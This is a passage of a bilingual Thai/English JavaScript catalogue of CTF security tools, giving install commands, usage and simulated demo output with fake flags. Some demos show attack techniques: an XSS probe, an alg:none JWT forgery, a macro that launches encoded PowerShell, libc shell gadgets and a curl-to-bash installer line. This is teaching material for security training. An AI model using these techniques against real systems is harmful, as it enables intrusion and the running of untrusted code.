      { cmd: "nc chall.ctf.io 1337", out: "Welcome! Answer the math to get the flag.\n7 * 6 = ?" },
      { cmd: "42", out: "Correct! CTT{n3tc4t_t4lks_tcp}" } ] },
  },
  {
    id: "aircrack-ng", name: "Aircrack-ng", category: "network", difficulty: 3, installed: true,
    tagline: { th: "ชุดโจมตี Wi-Fi WEP/WPA", en: "The Wi-Fi WEP/WPA attack suite" },
    description: { th: "จับ handshake แล้วแครกรหัส Wi-Fi ด้วย wordlist — สำหรับโจทย์ wireless ที่ได้รับอนุญาต", en: "Captures handshakes and cracks Wi-Fi keys with a wordlist — for authorised wireless challenges." },
    official: "https://www.aircrack-ng.org/", install: ["brew install aircrack-ng"],
    tags: ["wifi", "wpa", "wireless"],
  },
  {
    id: "yara", name: "YARA", category: "network", difficulty: 2, installed: true,
    tagline: { th: "เขียนกฎจับลายมัลแวร์/แพทเทิร์น", en: "Write rules to match malware / patterns" },
    description: { th: "สร้างกฎ (string + condition) เพื่อค้นไฟล์ที่เข้าเกณฑ์ ใช้ทั้ง malware analysis และ threat hunting", en: "Build rules (strings + condition) to flag matching files — used in malware analysis and threat hunting." },
    official: "https://yara.readthedocs.io/", install: ["brew install yara"],
    tags: ["malware", "rules", "hunting"],
    demo: { title: { th: "จับไฟล์ด้วยกฎ YARA", en: "Match files with a YARA rule" }, prompt: "ctf", steps: [
      { cmd: "yara -r flag_rule.yar ./samples/", out: "flag_marker ./samples/note.bin\nflag_marker ./samples/dump.raw" },
      { comment: "two samples contain the byte pattern the rule looks for" } ] },
  },

  // ───────────────────────────── MOBILE ─────────────────────────────
  {
    id: "jadx", name: "jadx", category: "mobile", difficulty: 2, featured: true, installed: true,
    tagline: { th: "decompile APK กลับเป็น Java อ่านง่าย", en: "Decompile an APK back to readable Java" },
    description: {
      th: "jadx แปลง Android APK/DEX กลับเป็นซอร์ส Java ที่อ่านได้ พร้อม GUI (jadx-gui) ให้ค้น string, ไล่ตามฟังก์ชัน และหา key/endpoint ที่ฝังในแอป",
      en: "jadx turns an Android APK/DEX back into readable Java source, with a GUI (jadx-gui) to search strings, follow methods and find keys/endpoints baked into the app.",
    },
    notes: {
      th: "เปิด `jadx-gui app.apk` แล้วค้นคำว่า flag, http, secret, key ใน Search ดู `AndroidManifest.xml` หา activity ที่ซ่อน และ `res/values/strings.xml` หา hardcoded string",
      en: "Open `jadx-gui app.apk` and search for flag, http, secret, key. Check `AndroidManifest.xml` for hidden activities and `res/values/strings.xml` for hardcoded strings.",
    },
    official: "https://github.com/skylot/jadx", repo: "https://github.com/skylot/jadx",
    platforms: ["macOS", "Linux", "Windows"], install: ["brew install jadx"],
    usage: [
      { cmd: "jadx-gui app.apk", desc: { th: "เปิด GUI decompile", en: "Open the decompiler GUI" } },
      { cmd: "jadx -d out app.apk", desc: { th: "decompile ลงโฟลเดอร์", en: "Decompile to a folder" } },
      { cmd: "grep -ri 'flag\\|http' out/", desc: { th: "ค้น string น่าสนใจ", en: "Grep for interesting strings" } },
    ],
    cheatsheet: [
      "jadx-gui app.apk        interactive decompiler",
      "jadx -d out app.apk     dump Java to ./out",
      "look at: AndroidManifest.xml, strings.xml",
      "search: flag http secret key token api",
    ],
    tags: ["apk", "android", "decompile", "java"],
    demo: {
      title: { th: "หา endpoint ที่ฝังในแอป", en: "Find an endpoint baked in the app" },
      prompt: "ctf",
      steps: [
        { cmd: "jadx -d out app.apk && grep -ri 'ctt{\\|https://' out/ | head",
          out: "out/.../MainActivity.java:  String SECRET = \"CTT{h4rdc0d3d_1n_4pk}\";\nout/.../Api.java:  private static final String BASE = \"https://api.ctf.local/v1\";" },
        { comment: "the flag was a string constant; note the hidden API base too" },
      ],
    },
  },
  {
    id: "apktool", name: "Apktool", category: "mobile", difficulty: 2, installed: true,
    tagline: { th: "แกะ/ประกอบ APK กลับ (smali + resource)", en: "Unpack / rebuild APKs (smali + resources)" },
    description: { th: "แยก APK เป็น smali และ resource แก้แล้วประกอบกลับ เหมาะกับ patch แอป", en: "Decodes an APK into smali and resources, edit and rebuild — great for patching apps." },
    official: "https://apktool.org/", install: ["brew install apktool"],
    tags: ["apk", "smali", "repack"],
  },
  {
    id: "frida", name: "Frida", category: "mobile", difficulty: 3, installed: false,
    tagline: { th: "hook/แก้แอปตอนรัน (dynamic)", en: "Hook & patch apps at runtime" },
    description: { th: "แทรกสคริปต์เข้าไปในแอปตอนทำงานเพื่อ bypass การตรวจ, ดัก crypto, ดูค่าจริง", en: "Injects scripts into a running app to bypass checks, hook crypto and inspect live values." },
    official: "https://frida.re/docs/home/", install: ["pipx install frida-tools"],
    tags: ["dynamic", "hook", "instrumentation"],
  },
  {
    id: "dex2jar", name: "dex2jar", category: "mobile", difficulty: 1, installed: true,
    tagline: { th: "แปลง DEX เป็น JAR", en: "Convert DEX to JAR" },
    description: { th: "เปลี่ยน .dex/.apk เป็น .jar เพื่อเปิดใน jd-gui หรือ decompiler อื่น", en: "Turns .dex/.apk into .jar to open in jd-gui or another decompiler." },
    official: "https://github.com/pxb1988/dex2jar", install: ["brew install dex2jar"],
    tags: ["apk", "dex", "jar"],
  },

  // ───────────────────────────── MISC / ALL-IN-ONE ─────────────────────────────
  {
    id: "ctf-helper", name: "ctf-helper.sh", category: "misc", difficulty: 1, featured: true, installed: true,
    tagline: { th: "มีดพับ encode/decode ที่เราเขียนเอง", en: "Our home-grown encode/decode multitool" },
    description: {
      th: "ctf-helper.sh (alias ctfh) เป็น wrapper รอบเครื่องมือที่ลงไว้ในเครื่อง มี mode encode/decode สำหรับ base64/32/hex/url/xor/rot/morse ฯลฯ และทางลัดไปยัง stegseek, john, RsaCtfTool รับ input ได้ทั้งข้อความ ไฟล์ และ stdin",
      en: "ctf-helper.sh (alias ctfh) wraps the installed tools with encode/decode modes for base64/32/hex/url/xor/rot/morse and shortcuts to stegseek, john and RsaCtfTool. Input can be literal text, a file path, or stdin.",
    },
    notes: {
      th: "ต่างจาก ctfid ตรงที่ ctfh ใช้เมื่อ 'รู้ชนิดแล้ว' อยากแปลงตรง ๆ ส่วน ctfid ใช้ตอน 'ยังไม่รู้ว่าอะไร' ให้มันเดา",
      en: "Unlike ctfid, use ctfh when you already know the transform you want; use ctfid when you don't yet know what something is.",
    },
    platforms: ["macOS", "Linux"], install: ["# ships in ~/.local/bin/ctf-helper.sh (alias ctfh)"],
    usage: [
      { cmd: "ctfh enc-b64 'text'", desc: { th: "encode base64", en: "Encode base64" } },
      { cmd: "ctfh dec-xor '<hex>' key", desc: { th: "ถอด XOR ด้วย key", en: "Decode XOR with a key" } },
      { cmd: "ctfh steg-jpg pic.jpg rockyou.txt", desc: { th: "แครก steghide ผ่าน stegseek", en: "Crack steghide via stegseek" } },
      { cmd: "ctfh hash 5d41402a...", desc: { th: "ระบุชนิดแฮช", en: "Identify a hash" } },
    ],
    cheatsheet: [
      "ctfh help                banner + all modes",
      "enc-/dec-: b64 b64url b32 hex url html bin dec",
      "           rot13 rot(N) morse rev xor",
      "id / hash / file         identify helpers",
      "steg-jpg steg-png qr ocr crack-hash rsa",
    ],
    tags: ["encode", "decode", "wrapper", "helper"],
    demo: {
      title: { th: "encode แล้ว decode กลับ", en: "Encode then decode back" },
      prompt: "ctf",
      steps: [
        { cmd: "ctfh enc-b64 'CTT{helper}'", out: "Q1RUe2hlbHBlcn0=" },
        { cmd: "ctfh dec-b64 'Q1RUe2hlbHBlcn0='", out: "CTT{helper}" },
        { cmd: "ctfh enc-xor 'CTT{xor}' mykey", out: "2e1116... (hex)" },
      ],
    },
  },
  {
    id: "chepy", name: "Chepy", category: "misc", difficulty: 1, installed: true,
    tagline: { th: "CyberChef ในรูปคอมมานด์ไลน์/Python", en: "CyberChef as a CLI / Python library" },
    description: { th: "ต่อ operation encode/decode/crypto เป็นสายบน CLI หรือใน Python สคริปต์ได้", en: "Chain encode/decode/crypto operations on the CLI or inside a Python script." },
    official: "https://github.com/securisec/chepy", install: ["uv tool install chepy"],
    tags: ["encode", "decode", "pipeline"],
  },
  {
    id: "hashid", name: "hashID", category: "misc", difficulty: 1, installed: true,
    tagline: { th: "ระบุชนิดแฮชแบบเบา ๆ", en: "Lightweight hash type identifier" },
    description: { th: "ทางเลือกเบา ๆ ของ name-that-hash เดาชนิดแฮชจากรูปแบบ", en: "A lightweight alternative to name-that-hash that guesses hash types by shape." },
    official: "https://github.com/psypanda/hashID", install: ["uv tool install hashid"],
    tags: ["hash", "identify"],
  },
  {
    id: "zbar", name: "ZBar (zbarimg)", category: "misc", difficulty: 1, installed: true,
    tagline: { th: "อ่าน QR/บาร์โค้ดจากรูป", en: "Read QR / barcodes from an image" },
    description: { th: "ถอด QR code และบาร์โค้ดจากไฟล์ภาพเป็นข้อความ", en: "Decodes QR codes and barcodes from image files to text." },
    official: "https://github.com/mchehab/zbar", install: ["brew install zbar"],
    usage: [{ cmd: "zbarimg code.png", desc: { th: "อ่าน QR จากรูป", en: "Read a QR from an image" } }],
    tags: ["qr", "barcode"],
    demo: { title: { th: "อ่าน QR จากรูป", en: "Read a QR from an image" }, prompt: "ctf", steps: [
      { cmd: "zbarimg -q qr.png", out: "QR-Code:CTT{qr_c0d3_d3c0d3d}" },
      { comment: "the QR encodes the flag directly" } ] },
  },
  {
    id: "tesseract", name: "Tesseract OCR", category: "misc", difficulty: 1, installed: true,
    tagline: { th: "อ่านตัวอักษรจากรูปภาพ (OCR)", en: "Read text from images (OCR)" },
    description: { th: "แปลงข้อความในรูปเป็นตัวอักษร เหมาะกับโจทย์ที่ flag อยู่ในภาพ", en: "Turns text inside an image into characters — handy when a flag lives in a picture." },
    official: "https://github.com/tesseract-ocr/tesseract", install: ["brew install tesseract"],
    usage: [{ cmd: "tesseract image.png -", desc: { th: "OCR ออกทางหน้าจอ", en: "OCR to stdout" } }],
    tags: ["ocr", "image", "text"],
    demo: { title: { th: "OCR ข้อความจากรูป", en: "OCR text out of an image" }, prompt: "ctf", steps: [
      { cmd: "tesseract flag_screenshot.png -", out: "The password for the next stage is\nCTT{0cr_r34ds_th3_1m4g3}" },
      { comment: "text baked into the image, now machine-readable" } ] },
  },
  {
    id: "cyberchef-magic", name: "p7zip", category: "misc", difficulty: 1, installed: true,
    tagline: { th: "แตก/บีบ archive แทบทุกชนิด", en: "Extract / compress almost any archive" },
    description: { th: "จัดการ 7z, zip, rar, tar และอีกมาก ใช้แตกไฟล์ประหลาด ๆ ในโจทย์ forensic", en: "Handles 7z, zip, rar, tar and more — useful for the odd archives in forensic challenges." },
    official: "https://p7zip.sourceforge.net/", install: ["brew install p7zip"],
    usage: [{ cmd: "7z x archive.7z", desc: { th: "แตกไฟล์", en: "Extract an archive" } }],
    tags: ["archive", "extract", "zip"],
  },
  {
    id: "cewl", name: "CeWL", category: "misc", difficulty: 1, installed: false,
    tagline: { th: "สร้าง wordlist จากเนื้อหาเว็บ", en: "Build a wordlist from a website" },
    description: { th: "ไต่เว็บเป้าหมายแล้วรวมคำที่พบเป็น wordlist สำหรับ brute-force เฉพาะทาง", en: "Crawls a target site and collects its words into a bespoke wordlist for targeted brute-force." },
    official: "https://github.com/digininja/CeWL", install: ["gem install cewl"],
    tags: ["wordlist", "web"],
  },
  {
    id: "seclists", name: "SecLists", category: "misc", difficulty: 1, installed: false,
    tagline: { th: "คลัง wordlist มาตรฐานของวงการ", en: "The industry-standard wordlist collection" },
    description: { th: "รวม wordlist สำหรับ directory, password, subdomain, fuzzing ที่ทุกคนใช้ (รวม rockyou)", en: "The collection everyone uses: directories, passwords, subdomains, fuzzing payloads (rockyou included)." },
    official: "https://github.com/danielmiessler/SecLists", install: ["brew install seclists", "# or git clone the repo"],
    tags: ["wordlist", "rockyou", "fuzzing"],
  },

  // ═══════════ EXPANSION: more tools across every category ═══════════
  // ── recon ──
  {
    id: "subfinder-alt", name: "Sublist3r", category: "recon", difficulty: 1,
    tagline: { th: "หา subdomain จาก search engine", en: "Subdomains via search engines" },
    description: { th: "เครื่องมือคลาสสิกที่รวม subdomain จาก Google, Bing, VirusTotal ฯลฯ", en: "Classic tool aggregating subdomains from Google, Bing, VirusTotal and more." },
    official: "https://github.com/aboul3la/Sublist3r", install: ["pipx install sublist3r"], tags: ["subdomain", "osint"],
  },
  {
    id: "dnsrecon", name: "dnsrecon", category: "recon", difficulty: 1,
    tagline: { th: "สำรวจ DNS ครบเครื่อง", en: "Full DNS enumeration" },
    description: { th: " query DNS records, zone transfer, brute subdomain ในตัวเดียว", en: "Queries DNS records, attempts zone transfers and brute-forces subdomains." },
    official: "https://github.com/darkoperator/dnsrecon", install: ["brew install dnsrecon"], tags: ["dns", "zone-transfer"],
    demo: { title: { th: "ลอง zone transfer", en: "Attempt a zone transfer" }, prompt: "kali@ctf", steps: [
      { cmd: "dnsrecon -d ctf.local -t axfr", out: "[*] Testing NS Servers for Zone Transfer\n[+] Zone Transfer was successful!!\n[*]      A admin.ctf.local 10.10.11.9\n[*]      A flag.ctf.local 10.10.11.42\n[*]      TXT ctf.local CTT{z0n3_tr4nsf3r_l34k}" },
      { comment: "misconfigured NS leaked every record + a flag" } ] },
  },
  {
    id: "waybackurls", name: "waybackurls", category: "recon", difficulty: 1,
    tagline: { th: "ดึง URL เก่าจาก Wayback Machine", en: "Pull historical URLs from Wayback" },
    description: { th: "รวม URL ที่เคยถูก index ของโดเมน มักเจอ endpoint หรือพารามิเตอร์เก่าที่ลืมปิด", en: "Collects every archived URL of a domain — often exposing forgotten endpoints or params." },
    official: "https://github.com/tomnomnom/waybackurls", install: ["go install github.com/tomnomnom/waybackurls@latest"], tags: ["osint", "urls", "archive"],
  },
  {
    id: "nikto", name: "Nikto", category: "recon", difficulty: 1,
    tagline: { th: "สแกนเว็บเซิร์ฟเวอร์หา misconfig", en: "Scan web servers for misconfigs" },
    description: { th: "ตรวจไฟล์/สคริปต์อันตราย, เวอร์ชันซอฟต์แวร์เก่า, การตั้งค่าผิด บนเว็บเซิร์ฟเวอร์", en: "Checks web servers for dangerous files, outdated versions and misconfigurations." },
    official: "https://github.com/sullo/nikto", install: ["brew install nikto"], tags: ["scanner", "web", "misconfig"],
  },
  {
    id: "whatweb", name: "WhatWeb", category: "recon", difficulty: 1,
    tagline: { th: "ระบุเทคโนโลยีที่เว็บใช้", en: "Fingerprint web technologies" },
    description: { th: "บอกว่าเว็บใช้ CMS, framework, server, JS library อะไร", en: "Identifies the CMS, framework, server and JS libraries a site runs." },
    official: "https://github.com/urbanadventurer/WhatWeb", install: ["brew install whatweb"], tags: ["fingerprint", "web"],
  },
  {
    id: "shodan", name: "Shodan CLI", category: "recon", difficulty: 2,
    tagline: { th: "ค้นอุปกรณ์/บริการที่เปิดบนอินเทอร์เน็ต", en: "Search internet-exposed devices" },
    description: { th: "ค้นหาโฮสต์ พอร์ต แบนเนอร์ ทั่วอินเทอร์เน็ตจากดัชนีของ Shodan (ต้องมี API key)", en: "Searches hosts, ports and banners across the internet from Shodan's index (needs an API key)." },
    official: "https://cli.shodan.io/", install: ["pipx install shodan"], tags: ["osint", "internet", "recon"],
  },

  // ── web ──
  {
    id: "wfuzz", name: "Wfuzz", category: "web", difficulty: 2,
    tagline: { th: "fuzz เว็บแบบยืดหยุ่นสูง", en: "Highly flexible web fuzzer" },
    description: { th: "แทนคำใน request ทุกส่วน (URL, header, POST) เพื่อค้นช่องโหว่และค่าที่ซ่อน", en: "Replaces markers anywhere in a request (URL, headers, POST) to discover hidden values and bugs." },
    official: "https://wfuzz.readthedocs.io/", install: ["pipx install wfuzz"], tags: ["fuzz", "web", "bruteforce"],
  },
  {
    id: "dalfox", name: "Dalfox", category: "web", difficulty: 2,
    tagline: { th: "สแกนและยืนยัน XSS อัตโนมัติ", en: "Automated XSS scanning & verification" },
    description: { th: "ตรวจ reflected/stored/DOM XSS พร้อมยืนยันว่า payload ทำงานจริง", en: "Detects reflected/stored/DOM XSS and verifies that a payload actually fires." },
    official: "https://github.com/hahwul/dalfox", install: ["brew install dalfox"], tags: ["xss", "scanner"],
    demo: { title: { th: "หา XSS ในพารามิเตอร์", en: "Find XSS in a parameter" }, prompt: "kali@ctf", steps: [
      { cmd: "dalfox url 'http://10.10.11.42/search?q=test'", out: "[POC][V][GET] http://10.10.11.42/search?q=<svg onload=alert(1)>\n[i] reflected param: q  (no filtering)\n[+] 1 vulnerability found" },
      { comment: "q is reflected unescaped — classic reflected XSS" } ] },
  },
  {
    id: "jwt-tool", name: "jwt_tool", category: "web", difficulty: 2,
    tagline: { th: "วิเคราะห์และโจมตี JWT", en: "Analyse and attack JWTs" },
    description: { th: "ถอด ตรวจ และทดสอบช่องโหว่ JWT: alg:none, key confusion, แครก secret", en: "Decodes, inspects and tests JWTs for alg:none, key confusion and secret cracking." },
    official: "https://github.com/ticarpi/jwt_tool", install: ["pipx install jwt-tool"], tags: ["jwt", "token", "attack"],
    demo: { title: { th: "ทดสอบ alg:none", en: "Test the alg:none attack" }, prompt: "ctf", steps: [
      { cmd: "jwt_tool <token> -X a", out: "Original JWT:\n[+] alg = HS256\n\njwttool_none_injection:\n[+] Tampered token (alg:none):\neyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.\n[!] server accepted unsigned token" },
      { comment: "backend trusted alg:none — auth bypass" } ] },
  },
  {
    id: "commix", name: "Commix", category: "web", difficulty: 2,
    tagline: { th: "เจาะ command injection อัตโนมัติ", en: "Automated command-injection exploitation" },
    description: { th: "ตรวจและใช้ประโยชน์จาก OS command injection ในพารามิเตอร์เว็บ", en: "Detects and exploits OS command injection in web parameters." },
    official: "https://github.com/commixproject/commix", install: ["pipx install commix"], tags: ["command-injection", "rce"],
  },
  {
    id: "dirsearch", name: "dirsearch", category: "web", difficulty: 1,
    tagline: { th: "brute path เว็บ เขียนด้วย Python", en: "Python web path brute-forcer" },
    description: { th: "ค้นไดเรกทอรีและไฟล์ด้วย wordlist มี filter และ recursion", en: "Discovers directories and files with wordlists, filtering and recursion." },
    official: "https://github.com/maurosoria/dirsearch", install: ["pipx install dirsearch"], tags: ["directory", "bruteforce"],
  },
  {
    id: "arjun", name: "Arjun", category: "web", difficulty: 1,
    tagline: { th: "ค้นพารามิเตอร์ HTTP ที่ซ่อน", en: "Discover hidden HTTP parameters" },
    description: { th: "หา query/POST parameter ที่ backend รับแต่ไม่ได้โชว์ ใช้หา IDOR/injection", en: "Finds query/POST params the backend accepts but doesn't advertise — good for IDOR/injection." },
    official: "https://github.com/s0md3v/Arjun", install: ["pipx install arjun"], tags: ["parameter", "discovery"],
  },
  {
    id: "katana", name: "Katana", category: "web", difficulty: 1,
    tagline: { th: "crawler เว็บเร็วจาก ProjectDiscovery", en: "Fast web crawler by ProjectDiscovery" },
    description: { th: "ไต่เว็บเก็บ endpoint, JS, form อย่างเร็ว ป้อนต่อเข้า nuclei/ffuf ได้", en: "Crawls sites for endpoints, JS and forms fast; feeds into nuclei/ffuf." },
    official: "https://github.com/projectdiscovery/katana", install: ["brew install katana"], tags: ["crawler", "spider"],
  },

  // ── crypto ──
  {
    id: "ciphey", name: "Ciphey", category: "crypto", difficulty: 1,
    tagline: { th: "ถอดรหัสอัตโนมัติด้วย AI/heuristic", en: "Automated decryption with AI/heuristics" },
    description: { th: "ป้อน ciphertext แล้วมันเดาและถอดให้เอง คล้าย ctfid แต่เน้น cipher คลาสสิก", en: "Feed ciphertext and it guesses & decrypts automatically — similar spirit to ctfid, strong on classical ciphers." },
    official: "https://github.com/Ciphey/Ciphey", install: ["pipx install ciphey"], tags: ["auto", "decode", "cipher"],
  },
  {
    id: "openssl", name: "OpenSSL", category: "crypto", difficulty: 2, installed: true,
    tagline: { th: "มีดพับ crypto/TLS บนคอมมานด์ไลน์", en: "The command-line crypto/TLS knife" },
    description: { th: "เข้ารหัส/ถอด, จัดการ key/cert, ตรวจ TLS, คำนวณ hash — งาน crypto พื้นฐานทำได้หมด", en: "Encrypts/decrypts, manages keys/certs, inspects TLS and computes hashes — the crypto workhorse." },
    official: "https://docs.openssl.org/", install: ["brew install openssl@3"],
    usage: [
      { cmd: "openssl rsa -in key.pem -text -noout", desc: { th: "ดูค่าใน RSA key", en: "Inspect an RSA key" } },
      { cmd: "openssl enc -d -aes-256-cbc -in c.bin -k pass", desc: { th: "ถอด AES", en: "Decrypt AES" } },
      { cmd: "openssl s_client -connect host:443", desc: { th: "ตรวจ cert TLS", en: "Inspect a TLS cert" } },
    ],
    tags: ["tls", "rsa", "aes", "cert"],
  },
  {
    id: "quipqiup", name: "quipqiup / substitution", category: "crypto", difficulty: 1,
    tagline: { th: "ถอด substitution cipher อัตโนมัติ", en: "Auto-solve substitution ciphers" },
    description: { th: "แก้ monoalphabetic substitution / cryptogram ด้วยสถิติภาษา", en: "Solves monoalphabetic substitution / cryptograms using language statistics." },
    official: "https://quipqiup.com/", install: ["# web tool — no install"], tags: ["substitution", "cryptogram"],
  },
  {
    id: "factordb", name: "FactorDB", category: "crypto", difficulty: 1,
    tagline: { th: "เช็คว่า n ถูกแฟกเตอร์ไว้แล้วหรือยัง", en: "Check if n is already factored" },
    description: { th: "ฐานข้อมูลการแฟกเตอร์จำนวนเต็ม โจทย์ RSA n เล็กมักโดนแฟกเตอร์ไว้แล้ว", en: "A database of integer factorizations — small RSA moduli are often already broken here." },
    official: "http://factordb.com/", install: ["# web; or `pip install factordb-pycli`"], tags: ["rsa", "factor"],
  },

  // ── forensics ──
  {
    id: "bulk-extractor", name: "bulk_extractor", category: "forensics", difficulty: 2,
    tagline: { th: "ดึง artifact จาก disk/dump แบบขนาน", en: "Extract artifacts from disks/dumps fast" },
    description: { th: "สแกนหาอีเมล, บัตรเครดิต, URL, ไฟล์ ในภาพดิสก์โดยไม่สนใจ filesystem", en: "Scans a disk image for emails, credit cards, URLs and files, ignoring the filesystem." },
    official: "https://github.com/simsong/bulk_extractor", install: ["brew install bulk_extractor"], tags: ["disk", "carve", "artifacts"],
  },
  {
    id: "testdisk", name: "TestDisk / PhotoRec", category: "forensics", difficulty: 2,
    tagline: { th: "กู้ partition และไฟล์ที่ถูกลบ", en: "Recover partitions and deleted files" },
    description: { th: "TestDisk ซ่อม partition table; PhotoRec กู้ไฟล์ตาม signature จากสื่อที่เสียหาย", en: "TestDisk repairs partition tables; PhotoRec carves files by signature from damaged media." },
    official: "https://www.cgsecurity.org/wiki/TestDisk", install: ["brew install testdisk"], tags: ["recover", "partition", "carve"],
  },
  {
    id: "oletools", name: "oletools", category: "forensics", difficulty: 2,
    tagline: { th: "วิเคราะห์มาโครใน Office/OLE", en: "Analyse macros in Office/OLE files" },
    description: { th: "แกะ VBA macro และโครงสร้าง OLE จากไฟล์ Office ที่ต้องสงสัย (โจทย์มัลแวร์)", en: "Extracts VBA macros and OLE structure from suspicious Office files (malware challenges)." },
    official: "https://github.com/decalage2/oletools", install: ["pipx install oletools"], tags: ["office", "macro", "malware"],
    demo: { title: { th: "ดึงมาโครจากไฟล์ .doc", en: "Dump a macro from a .doc" }, prompt: "ctf", steps: [
      { cmd: "olevba suspicious.doc", out: "VBA MACRO Module1\n- - - - - - - - - - - - - - - - - -\nSub AutoOpen()\n  Shell \"powershell -e <base64>\"\nEnd Sub\n\n+------------+-------------------+\n| Type       | Keyword           |\n+------------+-------------------+\n| AutoExec   | AutoOpen          |\n| Suspicious | Shell, powershell |\n+------------+-------------------+" },
      { comment: "AutoOpen runs a base64 PowerShell payload — decode it next" } ] },
  },
  {
    id: "pdf-parser", name: "pdf-parser / pdfid", category: "forensics", difficulty: 2,
    tagline: { th: "ผ่าโครงสร้าง PDF หา object ซ่อน", en: "Dissect PDF structure for hidden objects" },
    description: { th: "ชุดของ Didier Stevens ดู object, stream, JavaScript ที่ฝังใน PDF", en: "Didier Stevens' tools to inspect objects, streams and embedded JavaScript in PDFs." },
    official: "https://blog.didierstevens.com/programs/pdf-tools/", install: ["pipx install pdfid pdf-parser"], tags: ["pdf", "javascript"],
  },
  {
    id: "hexed", name: "hexdump / xxd", category: "forensics", difficulty: 1, installed: true,
    tagline: { th: "ดูไบต์ดิบของไฟล์", en: "View the raw bytes of a file" },
    description: { th: "อ่าน/แก้ไฟล์ระดับไบต์ ดู magic header หรือ patch ค่าเล็ก ๆ", en: "Read/edit files at the byte level — check magic headers or patch small values." },
    official: "https://man7.org/linux/man-pages/man1/xxd.1.html", install: ["# xxd ships with vim; hexdump is built in"],
    usage: [{ cmd: "xxd file | head", desc: { th: "ดู 16 ไบต์แรกต่อบรรทัด", en: "16 bytes per line" } }, { cmd: "xxd -r patched.hex > out.bin", desc: { th: "แปลง hex กลับเป็น binary", en: "Revert hex to binary" } }],
    tags: ["hex", "bytes", "patch"],
  },

  // ── stego ──
  {
    id: "steghide", name: "steghide (via stegseek)", category: "stego", difficulty: 1,
    tagline: { th: "ฝัง/แกะข้อมูลใน JPEG/WAV/BMP", en: "Embed/extract data in JPEG/WAV/BMP" },
    description: { th: "steganography คลาสสิกที่ใช้ passphrase บน macOS ใช้ stegseek แทน (extract/crack ได้)", en: "The classic passphrase-based steganography; on macOS use stegseek as the drop-in (extract/crack)." },
    official: "https://steghide.sourceforge.net/", install: ["# use stegseek on macOS (no steghide formula)"], tags: ["jpeg", "wav", "passphrase"],
  },
  {
    id: "wavsteg", name: "WavSteg / stegolsb", category: "stego", difficulty: 1,
    tagline: { th: "LSB steg ในไฟล์เสียง WAV", en: "LSB steg in WAV audio" },
    description: { th: "ซ่อน/ดึงข้อมูลใน least-significant bits ของตัวอย่างเสียง WAV", en: "Hides/extracts data in the LSBs of WAV audio samples." },
    official: "https://github.com/ragibson/Steganography", install: ["pipx install stego-lsb"], tags: ["audio", "wav", "lsb"],
  },
  {
    id: "aperisolve", name: "Aperi'Solve", category: "stego", difficulty: 1,
    tagline: { th: "วิเคราะห์ steg รูปแบบครบบนเว็บ", en: "All-in-one image steg analysis (web)" },
    description: { th: "อัปรูปแล้วมันรัน zsteg, steghide, binwalk, exiftool, bit-plane ให้ในหน้าเดียว", en: "Upload an image and it runs zsteg, steghide, binwalk, exiftool and bit-planes in one page." },
    official: "https://www.aperisolve.com/", install: ["# web tool"], tags: ["image", "auto", "web"],
  },

  // ── rev / pwn ──
  {
    id: "objdump", name: "objdump / binutils", category: "rev", difficulty: 2, installed: true,
    tagline: { th: "disassemble เร็ว ๆ บนคอมมานด์ไลน์", en: "Quick command-line disassembly" },
    description: { th: "ดู disassembly, section, symbol ของ binary แบบไว ๆ ก่อนเปิด Ghidra", en: "Dumps disassembly, sections and symbols of a binary quickly before opening Ghidra." },
    official: "https://sourceware.org/binutils/docs/binutils/objdump.html", install: ["# binutils; on macOS use gobjdump or llvm-objdump"],
    usage: [{ cmd: "objdump -d -M intel ./bin | less", desc: { th: "disassemble แบบ Intel syntax", en: "Disassemble in Intel syntax" } }],
    tags: ["disassemble", "binary"],
  },
  {
    id: "one-gadget", name: "one_gadget", category: "rev", difficulty: 3,
    tagline: { th: "หา one-shot RCE gadget ใน libc", en: "Find one-shot RCE gadgets in libc" },
    description: { th: "หา address ใน libc ที่กระโดดไปแล้วได้ shell ทันที ใช้ในโจทย์ pwn heap/ROP", en: "Finds an address in libc that spawns a shell in one jump — used in heap/ROP pwn." },
    official: "https://github.com/david942j/one_gadget", install: ["gem install one_gadget"], tags: ["pwn", "libc", "rce"],
    demo: { title: { th: "หา one_gadget ใน libc", en: "Find a one_gadget in libc" }, prompt: "ctf", steps: [
      { cmd: "one_gadget /lib/x86_64-linux-gnu/libc.so.6", out: "0x50a37 execve(\"/bin/sh\", rsp+0x40, environ)\nconstraints:\n  rsp & 0xf == 0\n  rcx == NULL\n\n0xebcf1 execve(\"/bin/sh\", r10, rdx)\nconstraints:\n  [r10] == NULL || r10 == NULL" },
      { comment: "jump to 0x50a37 when the constraints hold = instant shell" } ] },
  },
  {
    id: "strace-ltrace", name: "strace / ltrace", category: "rev", difficulty: 2,
    tagline: { th: "ดู syscall / library call ตอนรัน", en: "Trace syscalls / library calls at runtime" },
    description: { th: "ดูว่าโปรแกรมเรียก syscall หรือฟังก์ชัน library อะไร มักเผย logic การเช็ค flag", en: "Shows which syscalls or library functions a program calls — often reveals the flag check." },
    official: "https://strace.io/", install: ["# Linux; on macOS use dtruss/lldb"], tags: ["trace", "dynamic", "syscall"],
    demo: { title: { th: "จับ strcmp ที่เทียบ flag", en: "Catch the strcmp on the flag" }, prompt: "kali@ctf", steps: [
      { cmd: "ltrace ./crackme <<< 'guess'", out: "printf(\"Enter flag: \")\nfgets(\"guess\\n\", 32, stdin)\nstrcmp(\"guess\", \"CTT{ltr4c3_l34ks_1t}\") = -1\nputs(\"Nope.\")" },
      { comment: "ltrace printed the expected string right there" } ] },
  },
  {
    id: "gef", name: "GEF", category: "rev", difficulty: 3,
    tagline: { th: "ปลั๊กอิน GDB สาย exploit (ทางเลือก pwndbg)", en: "Exploit-focused GDB plugin (pwndbg alt)" },
    description: { th: "เพิ่มมุมมอง register/stack/heap และคำสั่งช่วยหา offset, pattern, ROP ใน GDB", en: "Adds register/stack/heap views and helpers for offsets, patterns and ROP to GDB." },
    official: "https://github.com/hugsy/gef", install: ["# bash -c \"$(curl -fsSL https://gef.blah.cat/sh)\""], tags: ["gdb", "pwn", "debug"],
  },
  {
    id: "ida-free", name: "IDA Free", category: "rev", difficulty: 3,
    tagline: { th: "disassembler ยอดนิยม (รุ่นฟรี)", en: "The popular disassembler (free edition)" },
    description: { th: "IDA รุ่นฟรีมี disassembler + decompiler พื้นฐาน คนสาย rev หลายคนถนัดมือ", en: "IDA's free edition offers a disassembler and basic decompiler that many reversers prefer." },
    official: "https://hex-rays.com/ida-free/", install: ["# download from hex-rays.com"], tags: ["disassembler", "gui"],
  },

  // ── network ──
  {
    id: "scapy", name: "Scapy", category: "network", difficulty: 3,
